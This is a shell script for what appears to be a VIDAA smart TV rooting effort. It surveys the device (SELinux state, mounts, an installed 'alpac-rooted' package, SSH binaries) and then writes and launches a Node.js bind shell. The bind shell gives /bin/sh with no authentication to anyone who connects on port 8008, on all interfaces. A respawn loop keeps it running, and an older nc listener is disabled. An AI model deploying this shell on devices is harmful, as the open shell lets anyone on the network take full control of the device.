export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
BB=/usr/local/bin/busybox
NODE=/APPS/pkgs/tv.vidaa.app.phoenix/CHA/bin/phoenix

echo "=== SELINUX ==="
getenforce 2>&1
cat /sys/fs/selinux/enforce 2>&1
echo "=== NODE ==="
$NODE --version 2>&1 | head -3
$NODE -e 'console.log("node-ok", process.version)' 2>&1 | head -5
echo "=== MOUNTS ==="
cat /proc/mounts
echo "=== ALPAC ROOT TREE ==="
ls -la /var/local/alpac-store-install-515bea7539486ffbc08587ca/root 2>&1 | head -30
echo "=== HOME EVENT HEAD ==="
$BB head -c 20 /var/local/alpac-store-install-515bea7539486ffbc08587ca/home-event 2>&1 | $BB od -An -tx1 2>&1
echo "=== IPK MEMBERS ==="
$NODE -e 'const fs=require("fs");const p="/var/local/alpac-store-install-515bea7539486ffbc08587ca/alpac-rooted.ipk";const b=fs.readFileSync(p);let o=8;while(o+60<=b.length){const n=b.toString("utf8",o,o+16).trim().replace(/\/+$/,"");const s=parseInt(b.toString("utf8",o+48,o+58).trim(),10);console.log(n,s);if(!isFinite(s))break;o+=60+s+(s%2);}' 2>&1 | head -10
echo "=== PKGS ==="
ls -la /APPS/pkgs 2>&1 | head -40
echo "=== DROPBEAR/SSH HUNT ==="
$BB find /APPS /opt /usr /var/local -maxdepth 5 -name 'dropbear*' 2>/dev/null | head -10
$BB find /APPS /opt /usr -maxdepth 5 -name 'sshd*' 2>/dev/null | head -10
echo "=== DEPLOY RSHELL ==="
mkdir -p /var/local/alvidaa
cat > /var/local/alvidaa/rshell.js <<'RSHELL_EOF'
const net = require('net');
const cp = require('child_process');
const PORT = 8008;
const ENV = Object.assign({}, process.env, {
  PATH: '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin'
});
net.createServer(function (sock) {
  var sh = cp.spawn('/bin/sh', [], { stdio: ['pipe', 'pipe', 'pipe'], env: ENV });
  sock.pipe(sh.stdin);
  sh.stdout.pipe(sock);
  sh.stderr.pipe(sock);
  sh.on('exit', function () { try { sock.end(); } catch (e) {} });
  sock.on('error', function () { try { sh.kill(); } catch (e) {} });
}).listen(PORT, '0.0.0.0', function () {
  console.log('alvidaa rshell listening on ' + PORT);
});
RSHELL_EOF
cat > /var/local/alvidaa/rshell.sh <<'RSH_EOF'
#!/bin/sh
while true; do
    /APPS/pkgs/tv.vidaa.app.phoenix/CHA/bin/phoenix /var/local/alvidaa/rshell.js >> /var/local/alvidaa/rshell.log 2>&1
    echo "rshell exited $(date)" >> /var/local/alvidaa/rshell.log
    sleep 3
done
RSH_EOF
chmod 755 /var/local/alvidaa/rshell.sh
rm -f /var/local/alvidaa/rshell.log
$BB setsid /bin/sh /var/local/alvidaa/rshell.sh >/dev/null 2>&1 </dev/null &
echo "rshell launched rc=$?"
sleep 3
echo "--- listen check ---"
grep -i ':1F48' /proc/net/tcp 2>&1
echo "--- log ---"
cat /var/local/alvidaa/rshell.log 2>&1 | head -10
echo "--- procs ---"
$BB ps 2>&1 | grep -Ei 'rshell|phoenix /var/local' | head -5
echo "=== CLEANUP OLD LISTENER ==="
if [ -f /APPS/.alvidaa/shell_listener.sh ]; then
    mv -f /APPS/.alvidaa/shell_listener.sh /APPS/.alvidaa/shell_listener.sh.off 2>/dev/null
    echo "nc listener script disabled"
fi
$BB ps 2>&1 | grep -c 'shell_listener' | sed 's/^/shell_listener procs: /'
echo "=== DONE ==="
exit
